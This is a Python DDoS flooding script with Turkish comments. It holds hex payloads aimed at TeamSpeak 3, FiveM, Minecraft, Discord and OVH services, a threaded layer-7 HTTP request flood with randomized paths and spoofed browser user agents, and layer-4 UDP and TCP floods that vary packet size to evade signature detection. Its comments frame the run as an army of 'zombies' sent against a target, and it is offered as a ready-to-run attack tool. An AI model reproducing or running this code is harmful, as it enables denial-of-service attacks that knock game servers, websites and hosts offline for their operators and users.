import socket
import random
import sys
import time
import threading
import ssl
import os

# --- GELİŞMİŞ HEX & PAYLOAD ARŞİVİ ---
HEX_DATA = {
    "ts3-init": b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02',
    "ts3-vox":  b'\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x05\x02\x04\x0b\x02',
    "fivem":    b'\xff\xff\xff\xffgetstatus\x00',
    "minecraft": b'\xfe\x01\xfa\x00\x0b\x00\x4d\x00\x43\x00\x7c\x00\x50\x00\x69\x00\x6e\x00\x67\x00\x48\x00\x6f\x00\x73\x00\x74',
    "discord":   b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01',
    "ovh-slam":  b'\x01\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00',
    "tcpbl":     b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', # RAW SYN-ACK Flood taklidi
}

# --- LAYER 7 BYPASS (GELİŞMİŞ) ---
def l7_bypass(target, duration, method):
    timeout = time.time() + duration
    host = target.replace("http://", "").replace("https://", "").split("/")[0]
    port = 443 if "https" in target else 80

    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if port == 443:
                s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
            
            s.connect((host, port))
            
            # Rastgele Method ve Yol (Path)
            m_type = "POST" if random.choice([True, False]) else "GET"
            path = "/" + str(random.randint(1, 9999)) if method == "http-kill" else "/"
            
            request = f"{m_type} {path} HTTP/1.1\r\n" \
                      f"Host: {host}\r\n" \
                      f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(100, 124)}.0.0.0 Safari/537.36\r\n" \
                      f"Accept: */*\r\n" \
                      f"Content-Length: {random.randint(10, 100) if m_type == 'POST' else 0}\r\n" \
                      f"Connection: keep-alive\r\n\r\n"
            
            if m_type == "POST":
                request += "data=" + "".join(random.choices("abcdef", k=10))
            
            s.send(request.encode())
            s.close()
        except:
            pass

# --- LAYER 4 BYPASS (GELİŞMİŞ) ---
def l4_bypass(target, port, duration, method):
    timeout = time.time() + duration
    payload = HEX_DATA.get(method, random._urandom(1024))
    
    if "udp" in method or method in ["ts3-init", "ts3-vox", "fivem", "discord"]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            # UDP Fragment: Paket boyutunu sürekli değiştirerek imzayı gizle
            size = random.randint(512, 1400) if method == "udpbypass" else len(payload)
            sock.sendto(payload[:size] if len(payload) > size else payload, (target, port))
    
    else: # TCP Metodları (OVH, RAPE, BL, VALID)
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                # Bağlantı kurarken zaman aşımını kısa tut ki hızlı döngüye girsin
                s.settimeout(1)
                s.connect((target, port))
                # TCP-BL veya OVH ise özel hex, değilse rastgele mermi
                s.send(payload if method in HEX_DATA else random._urandom(1024))
                s.close()
            except:
                pass

# --- ANA KONTROL ---
if __name__ == "__main__":
    if len(sys.argv) < 5: sys.exit()
    method, target, port, duration = sys.argv[1].lower(), sys.argv[2], int(sys.argv[3]), int(sys.argv[4])

    print(f"🔥 ORDULAR İLERİ! Metod: {method.upper()} | Hedef: {target}")

    is_l7 = method in ["http-delta", "http-tls", "cloudflare", "browser", "http-kill"]
    
    # Cloud Shell'i kasmamak için thread sayılarını dengeli tutuyoruz
    thread_count = 60 if is_l7 else 30
    for _ in range(thread_count):
        target_func = l7_bypass if is_l7 else l4_bypass
        args = (target, duration, method) if is_l7 else (target, port, duration, method)
        threading.Thread(target=target_func, args=args, daemon=True).start()
    
    time.sleep(duration)
    print("🏁 Görev başarıyla tamamlandı, zombiler dinlenmeye çekiliyor.")
